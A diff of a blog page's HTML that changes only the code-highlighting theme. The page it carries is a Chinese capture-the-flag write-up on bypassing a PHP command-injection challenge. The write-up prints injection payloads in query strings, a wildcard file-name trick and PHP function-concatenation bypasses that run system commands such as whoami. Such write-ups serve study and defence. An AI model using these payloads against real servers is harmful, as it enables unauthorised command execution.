@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,7 +253,7 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+              <h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     error_reporting(<span class="hljs-number">0</span>);
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
     $nep = $_GET[<span class="hljs-string">&#x27;nep&#x27;</span>];
@@ -255,19 +263,19 @@
     &#125;<span class="hljs-keyword">else</span>&#123;
         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too long!&#x27;</span>);
     &#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>长度限制的绕过：      </p>
-<div class="hljs"><pre><code>nep=`ls&gt;z`;&amp;len=-1     &gt;  写入文件
+<pre><code>nep=`ls&gt;z`;&amp;len=-1     &gt;  写入文件
 nep=`&gt;cat`;&amp;len=-1     &gt;cat  生成一个名为cat的文件  
-nep=`*&gt;z`;&amp;len=-1      输入通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数    </code></pre></div>
+nep=`*&gt;z`;&amp;len=-1      输入通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数    </code></pre>
 <hr>
-<div class="hljs"><pre><code>nep=`$nep`;ls&gt;z&amp;len=-1  
+<pre><code>nep=`$nep`;ls&gt;z&amp;len=-1  
 nep=`$nep`;&gt;cat&amp;len=-1       
-nep=`$nep`;*&gt;z&amp;len=-1     </code></pre></div>
+nep=`$nep`;*&gt;z&amp;len=-1     </code></pre>
 <hr>
-<div class="hljs"><pre><code>?len=7;ls &gt; 1.txt;&amp;nep=`$len`;
+<pre><code>?len=7;ls &gt; 1.txt;&amp;nep=`$len`;
 
-intval 处理前面的7，命令执行的是整个len        </code></pre></div>
+intval 处理前面的7，命令执行的是整个len        </code></pre>
 <hr>
 <p><strong>命令执行的绕过</strong><br>命令执行函数：   </p>
 <ol>
@@ -275,9 +283,9 @@ intval 处理前面的7，命令执行的是整个len        </code></pre></div>
 <li>assert     </li>
 <li>preg_replace()</li>
 </ol>
-<div class="hljs"><pre><code>preg_replace ( mixed $pattern , mixed $replacement ,         mixed $subject [, int $limit = -1 [, int &amp;  $count ]] ) : mixed       
+<pre><code>preg_replace ( mixed $pattern , mixed $replacement ,         mixed $subject [, int $limit = -1 [, int &amp;  $count ]] ) : mixed       
 
-当pattern后有/e是，如果subject中匹配到了pattern，则          replacement会被当作PHP代码执行      </code></pre></div>
+当pattern后有/e是，如果subject中匹配到了pattern，则          replacement会被当作PHP代码执行      </code></pre>
 <ul>
 <li>字符串拼接绕过<code>p.hpinfo()</code>、<code>((sy.(st).em)(whoami);</code>        </li>
 <li>多次传参绕过<code>cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</code>       </li>
@@ -429,6 +437,8 @@ intval 处理前面的7，命令执行的是整个len        </code></pre></div>
 
 
 
+  
+    
   
 
 
